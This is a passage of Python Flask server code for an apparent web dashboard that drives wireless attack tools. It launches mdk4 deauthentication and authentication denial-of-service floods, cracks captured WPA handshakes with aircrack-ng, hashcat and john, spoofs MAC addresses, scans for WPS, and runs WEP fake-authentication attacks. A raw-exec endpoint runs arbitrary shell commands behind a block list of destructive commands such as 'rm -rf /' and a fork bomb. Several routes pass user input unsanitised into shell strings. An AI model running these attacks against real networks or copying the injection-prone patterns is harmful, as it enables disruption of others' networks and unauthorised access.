        f"cat /sys/class/net/{iface}/device/uevent 2>/dev/null | grep DRIVER", timeout=5)
    driver_name = ""
    for _dl in driver_out.splitlines():
        if "DRIVER=" in _dl:
            driver_name = _dl.split("=")[-1].strip().lower()
            break
    if not driver_name:
        # Try ethtool as fallback
        eth_out, _, _ = run_cmd(f"ethtool -i {iface} 2>/dev/null | head -3", timeout=5)
        dm = re.search(r"driver:\s*(\S+)", eth_out, re.IGNORECASE)
        if dm: driver_name = dm.group(1).lower()
    _no_inject_warn = None
    if driver_name.startswith("iwl") or "iwlegacy" in driver_name:
        _no_inject_warn = (
            f"⚠ Intel WiFi adapter detected (driver: {driver_name}).\n"
            "   Intel wireless drivers (iwlwifi / iwlegacy) do NOT support\n"
            "   packet injection — this is a kernel driver limitation.\n"
            "   aireplay-ng will send broadcast probes but directed injection will fail.\n"
            "   → Use an external adapter: Alfa AWUS036ACH, AWUS036ACS, or TP-Link TL-WN722N.")
    elif any(x in driver_name for x in ["rtl8xxxu", "r8188", "r8192", "realtek"]):
        _no_inject_warn = (
            f"⚠ Realtek adapter detected (driver: {driver_name}).\n"
            "   Many Realtek drivers have limited injection support.\n"
            "   If injection fails, use an Alfa AWUS036ACH for reliable results.")
    if _no_inject_warn:
        log_lines.append("")
        log_lines.append(_no_inject_warn)
        log_lines.append("")

    # ── Step 1: Verify interface exists ──────────────────────────────────────
    iw_info, _, iw_rc = run_cmd(f"iw dev {iface} info 2>&1", timeout=5)
    if iw_rc != 0 or not iw_info.strip():
        msg = f"Interface '{iface}' not found. Run 'iw dev' to list available interfaces."
        log_lines.append(f"[!] {msg}")
        return jsonify({"output": "\n".join(log_lines), "working": False, "error": msg})

    # ── Step 2: Verify monitor mode ───────────────────────────────────────────
    in_monitor = "type monitor" in iw_info.lower()
    if not in_monitor:
        mode_line = next((l.strip() for l in iw_info.splitlines() if "type" in l.lower()), "unknown")
        msg = f"Interface '{iface}' is not in monitor mode (current: {mode_line}). Enable monitor mode first."
        log_lines.append(f"[!] {msg}")
        return jsonify({"output": "\n".join(log_lines), "working": False, "error": msg})
    log_lines.append(f"[✓] Interface is in monitor mode")

    # ── Step 3: Check rfkill ──────────────────────────────────────────────────
    rfkill_out, _, _ = run_cmd("rfkill list 2>/dev/null", timeout=5)
    if "Soft blocked: yes" in rfkill_out:
        log_lines.append("[!] rfkill soft block detected — attempting unblock...")
        run_cmd("rfkill unblock wifi 2>/dev/null; rfkill unblock all 2>/dev/null", timeout=5)
        log_lines.append("[*] rfkill unblock executed")

    # ── Step 4: Ensure interface is UP ────────────────────────────────────────
    up_out, _, _ = run_cmd(f"ip link set {iface} up 2>&1", timeout=5)
    if up_out.strip():
        log_lines.append(f"[*] ip link set up: {up_out.strip()}")

    # ── Step 5: Run aireplay-ng --test ───────────────────────────────────────
    log_lines.append(f"[*] Running: aireplay-ng --test {iface}")
    out, err, rc = run_cmd(f"aireplay-ng --test {iface} 2>&1", timeout=30)
    combined = (out + err).strip()
    log_lines.append(combined)

    working = "injection is working" in combined.lower()

    # ── Step 6: Detailed failure diagnosis ───────────────────────────────────
    if not working:
        lo = combined.lower()
        diag = []
        if "network is down" in lo or "wi_read" in lo or "wi_write" in lo:
            diag.append("Interface went DOWN during test — likely driver/kernel issue or Intel/Realtek adapter")
        if "invalid argument" in lo:
            diag.append("Kernel rejected the operation — interface state invalid; try re-enabling monitor mode")
        if "no answer" in lo and "found 0 ap" in lo:
            diag.append("No APs found nearby — move closer to a target network")
        if "no such device" in lo:
            diag.append(f"Interface '{iface}' disappeared — kernel driver may have reset it")
        if "operation not supported" in lo or "not supported" in lo:
            diag.append("Adapter does not support packet injection (Intel/Realtek built-in adapters never do)")
            diag.append("Use an Alfa AWUS036ACH, AWUS036ACS, or similar injection-capable adapter")
        if not diag:
            diag.append("Unknown failure — check dmesg for driver errors: sudo dmesg | tail -20")
        log_lines.append("")
        log_lines.append("[!] Injection test FAILED. Diagnosis:")
        for d in diag:
            log_lines.append(f"    • {d}")
        log_lines.append("")
        log_lines.append(f"[*] Manual test: aireplay-ng --test {iface}")
        log_lines.append(f"[*] Check driver: iw dev {iface} info | grep driver")

    audit("INJECTION_TEST", f"iface={iface} result={'OK' if working else 'FAIL'}")
    return jsonify({
        "output":  "\n".join(log_lines),
        "working": working,
        "success": f"✓ Injection is working on {iface}" if working else None,
        "error":   None if working else f"Injection test FAILED on {iface}. See output for diagnosis.",
    })


@app.route("/api/mdk4", methods=["POST"])
def mdk4_attack():
    data = request.json or {}; mode = data.get("mode","beacon")
    channel = str(data.get("channel","6")); bssid = (data.get("bssid") or "").strip()
    iface = get_active_iface()
    if not iface: return jsonify({"error": "No monitor interface active"})
    if not tool_exists("mdk4"): return jsonify({"error": "mdk4 not installed"})
    if mode == "beacon":
        cmd = f"mdk4 {iface} b -c {channel}"; label = f"Beacon flood CH{channel}"
    elif mode == "deauth_amok":
        cmd = f"mdk4 {iface} d {('-B '+bssid) if bssid else ''} -c {channel}"; label = f"Deauth amok CH{channel}"
    elif mode == "auth":
        if not bssid: return jsonify({"error": "BSSID required for auth DoS"})
        cmd = f"mdk4 {iface} a -a {bssid}"; label = f"Auth DoS against {bssid}"
    elif mode == "wids":
        cmd = f"mdk4 {iface} w -e FakeSSID -c {channel}"; label = f"WIDS confusion CH{channel}"
    elif mode == "michael":
        if not bssid: return jsonify({"error": "BSSID required for Michael attack"})
        cmd = f"mdk4 {iface} m -t {bssid}"; label = f"Michael TKIP shutdown {bssid}"
    else:
        return jsonify({"error": f"Unknown mode: {mode}"})
    audit("MDK4", f"mode={mode} bssid={bssid}")
    proc = run_bg("mdk4_"+mode, cmd); time.sleep(1); running = proc.poll() is None
    return jsonify({"success": f"{label} started (PID {proc.pid})" if running else None,
                    "error":   None if running else f"{label} — exited immediately",
                    "output":  f"$ {cmd}\n{'Running...' if running else 'Exited'}"})


@app.route("/api/mdk4/stop", methods=["POST"])
def mdk4_stop():
    data = request.json or {}; mode = data.get("mode",""); key = "mdk4_"+mode if mode else None
    if key: kill_bg(key)
    else:
        for k in list(state["active_processes"].keys()):
            if k.startswith("mdk4"): kill_bg(k)
    return jsonify({"success": "mdk4 stopped"})


@app.route("/api/dos/status")
def dos_status():
    running = {}
    for key in ["deauth","mdk4_beacon","mdk4_deauth_amok","mdk4_auth","mdk4_wids","mdk4_michael"]:
        proc = state["active_processes"].get(key)
        running[key] = proc is not None and proc.poll() is None
    return jsonify({"running": running, "any_active": any(running.values())})


# ── CRACKING ─────────────────────────────────────────────────────────────────

@app.route("/api/crack/aircrack", methods=["POST"])
def crack_aircrack():
    data = request.json or {}
    capfile  = (data.get("capfile") or "").strip() or state.get("last_cap_file","")
    wordlist = data.get("wordlist","/usr/share/wordlists/rockyou.txt")
    bssid    = (data.get("bssid") or "").strip()
    if not os.path.exists(capfile):
        available = sorted([TMPDIR+f for f in os.listdir(TMPDIR) if f.endswith(".cap")])
        return jsonify({"error": f"Cap not found: {capfile}. "+("Available: "+", ".join(available) if available else "No cap files")})
    if not os.path.exists(wordlist): return jsonify({"error": f"Wordlist not found: {wordlist}"})
    if not _safe_path(capfile, "/tmp/fufu-sec"): return jsonify({"error": "Invalid path"}), 400
    _hs_ok, _hs_raw, _ = _ac_verify(capfile, bssid)
    if not _hs_ok and bssid:
        # BSSID-specific verify failed — retry without BSSID filter.
        # The file may contain a valid handshake for this AP even if the
        # BSSID string matching is off (case, colons, etc.)
        _hs_ok_any, _hs_raw_any, _ = _ac_verify(capfile, "")
        if _hs_ok_any:
            _hs_ok  = True
            _hs_raw = _hs_raw_any
            log.info(f"crack_aircrack: HS confirmed without BSSID filter — proceeding")
    if not _hs_ok:
        return jsonify({"output": _hs_raw or "(no output)",
                        "error": ("No complete 4-way handshake found in this file. "
                                  "Capture again or verify the .cap with the Verify tab.")})
    audit("CRACK_AIRCRACK", f"cap={capfile} bssid={bssid}")
    cmd  = f"aircrack-ng '{capfile}' -w '{wordlist}' {'-b '+bssid if bssid else ''} 2>&1"
    proc = run_bg("aircrack", cmd)
    output = re.sub(r"\x1b\[[0-9;]*m|\[\d+K", "", read_output(proc, timeout=300))
    key_m  = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", output)
    if key_m: audit("CRACK_KEY_FOUND", f"bssid={bssid} key={key_m.group(1)}")
    not_found_msg = (
        "Password not in this wordlist. "
        "Try: (1) a larger wordlist, "
        "(2) hashcat with rules: hashcat -m 22000 -r best64.rule hash.txt wordlist.txt, "
        "(3) convert the cap to 22000 format first using the Convert tab."
    ) if not key_m else None
    return jsonify({"output": output,
                    "password":  key_m.group(1) if key_m else None,
                    "success":   f"KEY FOUND: {key_m.group(1)}" if key_m else None,
                    "not_found": not_found_msg,
                    "error":     None})   # Not an error — just not in this wordlist


@app.route("/api/crack/stop", methods=["POST"])
def crack_stop():
    data = request.json or {}; tool = data.get("tool","all"); stopped = []
    for t in ["aircrack","hashcat","john","crunch"]:
        if tool in ("all",t): kill_bg(t); stopped.append(t)
    return jsonify({"success": f"Stopped: {', '.join(stopped)}"})


@app.route("/api/crack/hashcat", methods=["POST"])
def crack_hashcat():
    data = request.json or {}
    hashfile = data.get("hashfile"); wordlist = data.get("wordlist","/usr/share/wordlists/rockyou.txt")
    mode = data.get("mode","22000"); attack = data.get("attack","0"); rules = data.get("rules","")
    if not hashfile or not os.path.exists(hashfile): return jsonify({"error": f"Hash file not found: {hashfile}"})
    if not tool_exists("hashcat"): return jsonify({"error": "hashcat not installed"})
    audit("CRACK_HASHCAT", f"hash={hashfile} mode={mode}")
    mask = data.get("mask","").strip()
    rules_flag = f"-r {rules}" if rules and os.path.exists(rules) else ""
    mask_flag  = mask if mask and attack in ("3","6","7") else ""
    pot = TMPDIR+"hashcat.pot"
    cmd = f"hashcat -m {mode} -a {attack} {hashfile} {wordlist} {rules_flag} {mask_flag} --potfile-path {pot} --status --status-timer=5 2>&1"
    proc = run_bg("hashcat", cmd)
    output = read_output(proc, timeout=120)
    key_m = re.search(r"([a-f0-9]{32}[^:]*:[^:]*:[^:]*:[^:]*:[^:]*:([^\n]+))", output, re.IGNORECASE)
    if key_m: audit("HASHCAT_CRACKED", f"hash={hashfile}")
    return jsonify({"output": output, "password": key_m.group(2).strip() if key_m else None,
                    "success": f"CRACKED: {key_m.group(2).strip()}" if key_m else None})


@app.route("/api/crack/john", methods=["POST"])
def crack_john():
    data = request.json or {}; hashfile = data.get("hashfile")
    wordlist = data.get("wordlist","/usr/share/wordlists/rockyou.txt"); fmt = data.get("format","")
    if not hashfile or not os.path.exists(hashfile): return jsonify({"error": f"Hash file not found: {hashfile}"})
    if not tool_exists("john"): return jsonify({"error": "john not installed"})
    audit("CRACK_JOHN", f"hash={hashfile}")
    proc = run_bg("john", f"john --wordlist='{wordlist}' {'--format='+fmt if fmt else ''} '{hashfile}' 2>&1")
    output = read_output(proc, timeout=180)
    show_out, _, _ = run_cmd(f"john --show '{hashfile}' 2>&1")
    return jsonify({"output": output+("\n--- CRACKED ---\n"+show_out if show_out.strip() else "")})


@app.route("/api/wordlist/crunch", methods=["POST"])
def crunch_wordlist():
    data = request.json or {}; min_len = data.get("min",8); max_len = data.get("max",10)
    chars = data.get("chars","abcdefghijklmnopqrstuvwxyz0123456789")
    pattern = data.get("pattern",""); out_file = data.get("output", TMPDIR+"wordlist.txt")
    if not tool_exists("crunch"): return jsonify({"error": "crunch not installed"})
    if int(max_len) > 12: return jsonify({"error": "Max length capped at 12 to prevent disk exhaustion"})
    proc = run_bg("crunch", f"crunch {min_len} {max_len} '{chars}' {('-t '+pattern) if pattern else ''} -o {out_file} 2>&1")
    return jsonify({"output": read_output(proc, timeout=30),
                    "success": f"Wordlist saved to {out_file}" if os.path.exists(out_file) else None})


@app.route("/api/crack/convert", methods=["POST"])
def crack_convert():
    """
    Convert .cap to hashcat 22000 format using hcxpcapngtool.
    cap2hccapx (.hccapx / mode 2500) is removed — hashcat deprecated mode 2500
    in v6.2.4; mode 22000 is the current standard and is produced by hcxpcapngtool.
    Also supports converting PMKID pcapng files from hcxdumptool.
    """
    data = request.json or {}
    capfile = (data.get("capfile") or "").strip() or state.get("last_cap_file","")
    if not capfile or not os.path.exists(capfile):
        available = sorted([os.path.join(TMPDIR,f) for f in os.listdir(TMPDIR)
                            if f.endswith((".cap",".pcapng"))])
        return jsonify({"error": f"File not found: {capfile}. "+
                       ("Available: "+", ".join(available) if available else "No cap/pcapng files")})
    if not _safe_path(capfile, "/tmp/fufu-sec"): return jsonify({"error": "Invalid path"}), 400
    if not tool_exists("hcxpcapngtool"):
        return jsonify({"error": "hcxpcapngtool not installed — apt install hcxtools"})

    out = [
        f"[*] Input  : {capfile}  ({os.path.getsize(capfile)} bytes)",
        f"[*] Tool   : hcxpcapngtool (hashcat mode 22000 / WPA-PBKDF2-PMKID+EAPOL)",
        "[*] Note   : cap2hccapx removed — hashcat mode 2500 deprecated since v6.2.4",
    ]

    # Check for handshake / PMKID in the file
    has_hs, _, _ = _ac_verify(capfile)
    out.append(f"[*] Handshake check: {'FOUND' if has_hs else 'NOT FOUND (may still contain PMKID)'}")

    # Convert to 22000 format
    outfile_22000 = re.sub(r"\.(cap|pcapng)$", "_22000.txt", capfile)
    if outfile_22000 == capfile:
        outfile_22000 = capfile + "_22000.txt"

    conv_out, conv_err, conv_rc = run_cmd(
        f"hcxpcapngtool -o '{outfile_22000}' '{capfile}' 2>&1", timeout=30)
    hcx_ok  = (conv_rc == 0 and os.path.exists(outfile_22000)
               and os.path.getsize(outfile_22000) > 0)
    no_hash = "no hashes written" in conv_out.lower()

    out.append(f"[hcxpcapngtool output]")
    for l in conv_out.strip().splitlines():
        out.append(f"  {l}")

    if hcx_ok:
        line_count = 0
        try:
            with open(outfile_22000) as hf:
                line_count = sum(1 for _ in hf)
        except Exception:
            pass
        out.append(f"[+] Converted → {outfile_22000}  ({line_count} hash line(s))")
        audit("CRACK_CONVERT", f"cap={capfile} out={outfile_22000} hashes={line_count}")
        return jsonify({
            "success":       f"Converted → {outfile_22000}  ({line_count} hash line(s))",
            "outfile":       outfile_22000,
            "outfile_22000": outfile_22000,
            "output":        "\n".join(out),
        })
    else:
        reasons = []
        if no_hash:                          reasons.append("No PMKID or EAPOL frames in file")
        if "radiotap" in conv_out.lower():   reasons.append("Missing radiotap headers — recapture with pcap+csv format")
        if "authentication" in conv_out.lower(): reasons.append("Missing auth frames — capture was too short")
        if not has_hs:                       reasons.append("No complete 4-way handshake detected")
        if not reasons:                      reasons.append("File may only contain beacon frames")
        out += [f"[!] {r}" for r in reasons]
        out.append("[*] TIP: Capture longer · send deauth · verify handshake first")
        return jsonify({"output": "\n".join(out),
                        "error": "Conversion failed: " + " | ".join(reasons)})


@app.route("/api/wordlists")
def list_wordlists():
    found = []
    for p in ["/usr/share/wordlists","/usr/share/wordlists/rockyou.txt","/opt/wordlists",TMPDIR]:
        if os.path.isfile(p): found.append({"path":p,"size":os.path.getsize(p),"lines":"?"})
        elif os.path.isdir(p):
            for f in os.listdir(p):
                fp = os.path.join(p,f)
                if os.path.isfile(fp) and any(f.endswith(e) for e in [".txt",".lst",".gz"]):
                    found.append({"path":fp,"size":os.path.getsize(fp),"lines":"?"})
    return jsonify({"wordlists": found})




# ── UPDATE CHECK ─────────────────────────────────────────────────────────────
# Mirrors airgeddon autoupdate_check() — fetches server.py from main branch,
# reads the version string and compares to running version.

FUFU_VERSION  = "3.5.0"
FUFU_REPO_RAW = "https://raw.githubusercontent.com/kyllr-qwen/fufu-sec/main/server.py"
FUFU_REPO_URL = "https://github.com/kyllr-qwen/fufu-sec"

@app.route("/api/update/check")
def update_check():
    """
    Check for updates using GitHub Releases API first, then raw-file fallback.
    Mirrors airgeddon autoupdate_check() but uses Python urllib (no curl dependency).
    Handles repos that have no releases yet gracefully.
    """
    import urllib.request, urllib.error, json as _json

    result = {
        "current_version": FUFU_VERSION,
        "latest_version":  None,
        "up_to_date":      None,
        "repo_url":        FUFU_REPO_URL,
        "error":           None,
        "method":          None,
        "note":            None,
    }

    _headers = {"User-Agent": "fufu-sec-update-check/1.0",
                "Accept": "application/vnd.github+json"}

    # ── Method 1: GitHub Releases API ────────────────────────────────────────
    api_url = "https://api.github.com/repos/kyllr-qwen/fufu-sec/releases/latest"
    try:
        req = urllib.request.Request(api_url, headers=_headers)
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = _json.loads(resp.read().decode("utf-8"))
        tag = data.get("tag_name", "").lstrip("v").strip()
        if tag:
            result.update({"latest_version": tag,
                           "up_to_date": (tag == FUFU_VERSION),
                           "method": "github-releases-api"})
            return jsonify(result)
    except urllib.error.HTTPError as e:
        if e.code == 404:
            # Repo exists but no releases published yet
            result.update({"latest_version": FUFU_VERSION, "up_to_date": True,
                           "method": "no-releases-yet",
                           "note": "No releases published yet — you have the latest source code."})
            return jsonify(result)
        # Other HTTP error — fall through to raw-file check
    except Exception:
        pass   # network error — try raw file

    # ── Method 2: Raw server.py from main branch ──────────────────────────────
    try:
        req2 = urllib.request.Request(FUFU_REPO_RAW, headers=_headers)
        with urllib.request.urlopen(req2, timeout=10) as resp:
            raw = resp.read(8192).decode("utf-8", errors="replace")
        # Simple robust pattern — no raw string escaping pitfalls
        ver_pat = re.compile(r'FUFU_VERSION\s*=\s*["\']([0-9][0-9.a-zA-Z\-]+)')
        m = ver_pat.search(raw)
        if m:
            latest = m.group(1)
            result.update({"latest_version": latest,
                           "up_to_date": (latest == FUFU_VERSION),
                           "method": "raw-file"})
        else:
            result["error"] = ("Version not found in remote file. "
                               "Repo may not be published yet — check "
                               "github.com/kyllr-qwen/fufu-sec manually.")
    except urllib.error.HTTPError as e:
        if e.code == 404:
            result["error"] = ("Repository not found at github.com/kyllr-qwen/fufu-sec. "
                               "Push the repo to GitHub to enable update checks.")
        else:
            result["error"] = f"HTTP {e.code} from GitHub"
    except urllib.error.URLError as e:
        result["error"] = f"Network error: {e.reason}"
    except Exception as e:
        result["error"] = str(e)

    return jsonify(result)

# ── DEPENDENCIES ─────────────────────────────────────────────────────────────

# xterm/lspci: airgeddon requires these for its terminal windows,
# but fufu-sec uses a browser terminal — xterm not needed here.
ESSENTIAL_TOOLS = ["iw","awk","airmon-ng","airodump-ng","aircrack-ng","ip","ps","aireplay-ng","mdk4"]
# beef-xss excluded: it is a browser-exploitation tool (requires Ruby/Node), not a wireless tool
OPTIONAL_TOOLS  = [
    "wpaclean", "crunch",    "aireplay-ng",   "mdk4",        "hashcat",
    "hostapd",  "dhcpd",     "nft",           "ettercap",    "etterlog",
    "lighttpd", "dnsmasq",   "wash",          "reaver",      "bully",
    "pixiewps",  "bettercap", "packetforge-ng", "hostapd-wpe", "asleap",
    "john",     "openssl",   "hcxpcapngtool", "hcxdumptool", "tshark",
    "tcpdump",  "besside-ng","hostapd-mana","hcxhash2cap","hcxhashtool",
]

@app.route("/api/deps")
def check_deps():
    return jsonify({"tools": {t: tool_exists(t) for t in ESSENTIAL_TOOLS + OPTIONAL_TOOLS}})


# ── RAW EXEC ─────────────────────────────────────────────────────────────────

BLOCKED_CMDS = ["rm -rf /","rm -rf ~","mkfs","dd if=",":(){ :|:& };:","shred /","> /dev/sda","chmod -R 777 /"]

@app.route("/api/exec", methods=["POST"])
def raw_exec():
    data = request.json or {}; cmd = data.get("command","")
    if not cmd: return jsonify({"error": "No command provided"})
    for blocked in BLOCKED_CMDS:
        if blocked in cmd:
            audit("EXEC_BLOCKED", f"cmd={cmd[:120]}")
            return jsonify({"error": f"Blocked command: {blocked}"})
    audit("EXEC", f"cmd={cmd[:120]}")
    stdout, stderr, rc = run_cmd(cmd, timeout=30)
    return jsonify({"output": stdout+stderr, "returncode": rc, "error": None if rc==0 else f"Exit code {rc}"})


# ── SYSTEM INFO ───────────────────────────────────────────────────────────────

@app.route("/api/system/info")
def system_info():
    # CPU: two /proc/stat snapshots 250ms apart → real usage %, no awk escaping needed
    def _cpu_pct():
        try:
            def _read_stat():
                with open('/proc/stat') as f:
                    for line in f:
                        if line.startswith('cpu '):
                            vals = list(map(int, line.split()[1:]))
                            idle = vals[3] + (vals[4] if len(vals)>4 else 0)
                            total = sum(vals)
                            return total, idle
                return 0, 0
            t1, i1 = _read_stat()
            import time as _t; _t.sleep(0.25)
            t2, i2 = _read_stat()
            dt = t2-t1; di = i2-i1
            if dt > 0:
                return f"{(dt-di)/dt*100:.1f}"
        except Exception:
            pass
        return "?"
    cpu_out = _cpu_pct()
    mem_out,  _, _ = run_cmd("free -m | awk 'NR==2{printf \"%s %s %s\", $2,$3,$4}'")
    disk_out, _, _ = run_cmd("df -h /tmp | awk 'NR==2{print $3\" \"$4}'")
    uptime_o, _, _ = run_cmd("uptime -p 2>/dev/null || uptime")
    kernel_o, _, _ = run_cmd("uname -r")
    distro_o, _, _ = run_cmd("lsb_release -d 2>/dev/null | cut -d: -f2 || cat /etc/os-release | grep PRETTY | cut -d= -f2")
    dead_keys = []; active = {}
    try: snapshot = list(state["active_processes"].items())
    except: snapshot = []
    for k, v in snapshot:
        try: still = v.poll() is None
        except: still = False
        if still: active[k] = True
        else: dead_keys.append(k)
    for k in dead_keys:
        with _proc_lock: state["active_processes"].pop(k, None)
    mp = mem_out.strip().split()
    mem_total = int(mp[0]) if mp else 0; mem_used = int(mp[1]) if len(mp)>1 else 0
    return jsonify({"cpu": (cpu_out if isinstance(cpu_out,str) else cpu_out.strip()) or "?",
                    "mem_total": mem_total, "mem_used": mem_used,
                    "mem_pct":   round(mem_used/mem_total*100) if mem_total else 0,
                    "disk": disk_out.strip(), "uptime": uptime_o.strip(),
                    "kernel": kernel_o.strip(), "distro": distro_o.strip().strip('"'),
                    "active_processes": active, "scan_count": len(state.get("scan_results",[]))})


# ── INTERFACE TOOLS ───────────────────────────────────────────────────────────

@app.route("/api/iface/details", methods=["GET","POST"])
def iface_details():
    data = request.json or {}
    iface = data.get("interface") or request.args.get("iface") or get_active_iface() or ""
    if not iface: return jsonify({"error": "No interface"})
    iw_out,   _, _ = run_cmd(f"iw dev {iface} info 2>/dev/null")
    mac_out,  _, _ = run_cmd(f"cat /sys/class/net/{iface}/address 2>/dev/null")
    iwcfg,    _, _ = run_cmd(f"iwconfig {iface} 2>/dev/null")
    driver_o, _, _ = run_cmd(f"ethtool -i {iface} 2>/dev/null | head -5")
    phy = "phy0"
    for line in iw_out.splitlines():
        # "iw dev" output: "  wiphy 0" or "  wiphy phy0"
        if line.strip().lower().startswith("wiphy"):
            parts = line.strip().split()
            if len(parts) >= 2:
                val = parts[-1]
                phy = val if val.startswith("phy") else f"phy{val}"
            break
    bands_out,   _, _ = run_cmd(f"iw {phy} info 2>/dev/null | grep -E -A3 'Band|MHz|dBm' | head -60")
    caps_out,    _, _ = run_cmd(f"iw {phy} info 2>/dev/null | grep -E 'HT cap|VHT cap|Capabilit|monitor|inject' | head -20")
    support_mon, _, _ = run_cmd(f"iw {phy} info 2>/dev/null | grep -c 'monitor'")
    support_inj, _, _ = run_cmd(f"iw {phy} info 2>/dev/null | grep -c 'inject'")
    lines = []
    if iw_out:    lines += ["=== iw dev info ==="]    + [l for l in iw_out.splitlines()    if l.strip()]
    if iwcfg:     lines += ["=== iwconfig ==="]       + [l for l in iwcfg.splitlines()     if l.strip()]
    if driver_o:  lines += ["=== Driver ==="]         + [l for l in driver_o.splitlines()  if l.strip()]
    if bands_out: lines += ["=== Bands/Channels ==="] + [l for l in bands_out.splitlines() if l.strip()]
    if caps_out:  lines += ["=== Capabilities ==="]   + [l for l in caps_out.splitlines()  if l.strip()]
    lines += [f"=== Monitor support: {'YES' if support_mon.strip()!='0' else 'NO'} ==="]
    lines += [f"=== Packet inject : {'YES' if support_inj.strip()!='0' else 'NO'} ==="]
    full = "\n".join(lines)
    return jsonify({"iw_info":iw_out,"mac":mac_out.strip(),"bands":bands_out,"caps":caps_out,
                    "full_output":full,"iw_phy":full,"output":full})


@app.route("/api/iface/txpower", methods=["POST"])
def set_txpower():
    data = request.json or {}; iface = data.get("interface") or get_active_iface(); level = data.get("level","30")
    # iw uses mBm (dBm × 100); iwconfig uses dBm directly
    # Some adapters require: iw reg set BO (or similar permissive country) first
    level_int = int(level)
    mbm = level_int * 100
    out1, _, rc1 = run_cmd(f"iw dev {iface} set txpower fixed {mbm} 2>&1", timeout=10)
    if rc1 != 0:
        out2, _, rc2 = run_cmd(f"iwconfig {iface} txpower {level_int}dBm 2>&1", timeout=10)
        out = out1.strip() + ("\n" if out1.strip() else "") + out2.strip()
        ok  = rc2 == 0
    else:
        out = out1.strip(); ok = True
    hint = " (If this fails, set regulatory domain to BO or 00 first)" if not ok else ""
    return jsonify({"output": out or "(no output)", "success": f"TX power set to {level} dBm" if ok else None,
                    "error": f"TX power change failed — adapter may not support it.{hint}" if not ok else None})


@app.route("/api/iface/chanhop", methods=["POST"])
def chan_hop():
    data = request.json or {}; iface = data.get("interface") or get_active_iface()
    chans = data.get("channels",list(range(1,15))); dwell = float(data.get("dwell",0.5))
    state["chanhop_running"] = True
    def _hop():
        while state.get("chanhop_running"):
            for ch in chans:
                if not state.get("chanhop_running"): break
                run_cmd(f"iw dev {iface} set channel {ch} 2>/dev/null || iwconfig {iface} channel {ch} 2>/dev/null")
                time.sleep(dwell)
    threading.Thread(target=_hop, daemon=True).start()
    return jsonify({"success": f"Channel hopping started on {iface}"})


@app.route("/api/iface/chanhop/stop", methods=["POST"])
def chan_hop_stop():
    state["chanhop_running"] = False; return jsonify({"success": "Channel hopping stopped"})


@app.route("/api/iface/macspoof", methods=["POST"])
def mac_spoof():
    data = request.json or {}; iface = data.get("interface") or get_active_iface(); mac = data.get("mac","random")
    if mac == "random":
        import random
        mac = "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0,255) for _ in range(5))
    audit("MAC_SPOOF", f"iface={iface} mac={mac}")
    out, _, rc = run_cmd(f"ip link set {iface} down && ip link set {iface} address {mac} && ip link set {iface} up 2>&1")
    return jsonify({"output":out,"mac":mac,"success":f"MAC changed to {mac}" if rc==0 else None,"error":out if rc!=0 else None})


@app.route("/api/scan/wps", methods=["POST"])
def scan_wps():
    data = request.json or {}; iface = get_active_iface(); time_ = int(data.get("time",15))
    if not iface: return jsonify({"error": "No monitor interface"})
    if not tool_exists("wash"): return jsonify({"error": "wash not installed — apt install reaver"})
    out_file = TMPDIR+"wash_out.txt"
    try: os.remove(out_file)
    except: pass
    proc = run_bg("wash", f"wash -i {iface} -s -C -o {out_file} 2>&1"); time.sleep(1.5)
    if proc.poll() is not None:
        proc = run_bg("wash", f"wash -i {iface} -s -o {out_file} 2>&1"); time.sleep(1)
        if proc.poll() is not None: return jsonify({"error": "wash failed to start"})
    deadline = time.time() + time_
    while time.time() < deadline:
        if proc.poll() is not None: break
        time.sleep(0.5)
    kill_bg("wash"); time.sleep(0.3)
    stdout, _, _ = run_cmd(f"cat '{out_file}' 2>/dev/null")
    wps_nets = []
    for line in stdout.splitlines():
        line = line.strip()
        if not line or line.startswith("BSSID") or line.startswith("-") or line.startswith("["): continue
        parts = line.split()
        if len(parts) >= 5 and re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", parts[0]):
            locked_raw = parts[4] if len(parts)>4 else "?"
            locked = "1" if locked_raw.lower() in ("yes","1","true","locked") else "0"
            essid_start = 6 if len(parts)>6 else 5
            essid = " ".join(parts[essid_start:]).strip() if len(parts)>essid_start else ""
            wps_nets.append({"bssid":parts[0],"channel":parts[1],"rssi":parts[2],
                             "wps_version":parts[3] if len(parts)>3 else "?","wps_locked":locked,"essid":essid})
    state["wps_scan_results"] = wps_nets
    # Merge WPS data into the main scan results so the Discovered Networks table
    # shows WPS=YES and exposes wps_version + wps_locked without requiring users
    # to cross-reference two separate panels.
    wps_lookup = {n["bssid"].upper(): n for n in wps_nets}
    updated = 0
    for net in state.get("scan_results", []):
        info = wps_lookup.get(net.get("bssid","").upper())
        if info:
            net["wps"]         = True
            net["wps_version"] = info.get("wps_version","?")
            net["wps_locked"]  = info.get("wps_locked","?")
            updated += 1
    return jsonify({"output": stdout, "networks": wps_nets, "count": len(wps_nets),
                    "merged_into_scan": updated})


@app.route("/api/wps/reaver/stop", methods=["POST"])
def wps_reaver_stop():
    kill_bg("reaver"); return jsonify({"success": "Reaver stopped"})

@app.route("/api/wps/bully/stop", methods=["POST"])
def wps_bully_stop():
    kill_bg("bully"); return jsonify({"success": "Bully stopped"})

@app.route("/api/wps/pixie/stop", methods=["POST"])
def wps_pixie_stop():
    kill_bg("pixie"); return jsonify({"success": "Pixie stopped"})

@app.route("/api/wps/pinattack/stop", methods=["POST"])
def wps_pinattack_stop():
    kill_bg("pinattack"); return jsonify({"success": "PIN attack stopped"})





# ── WEP ATTACKS ──────────────────────────────────────────────────────────────

@app.route("/api/wep/attack", methods=["POST"])
def wep_attack():
    data = request.json or {}; mode = data.get("mode","arp")
    bssid = (data.get("bssid") or "").strip(); channel = (data.get("channel") or "").strip()
    client = (data.get("client") or "").strip(); essid = (data.get("essid") or "").strip()
    output = data.get("output", TMPDIR+"wep_arp"); iface = get_active_iface()
    if not iface: return jsonify({"error": "No monitor interface"})
    audit("WEP_ATTACK", f"mode={mode} bssid={bssid}")
    if mode == "fakeauth":
        if not bssid: return jsonify({"error": "BSSID required"})
        delay = data.get("fa_delay","0"); keep = data.get("fa_keep","10")
        essid_flag = f"-e '{essid}'" if essid else ""
        cmd = f"aireplay-ng -1 {delay} -o 1 -q {keep} -a {bssid} {essid_flag} {iface}"
        proc = run_bg("wep_fakeauth", cmd); time.sleep(2); running = proc.poll() is None
        out = ""
        try:
            import select as _sel
            if _sel.select([proc.stdout],[],[],2)[0]:
                for _ in range(6):
                    l = proc.stdout.readline()
                    if not l: break
                    out += l
        except: pass
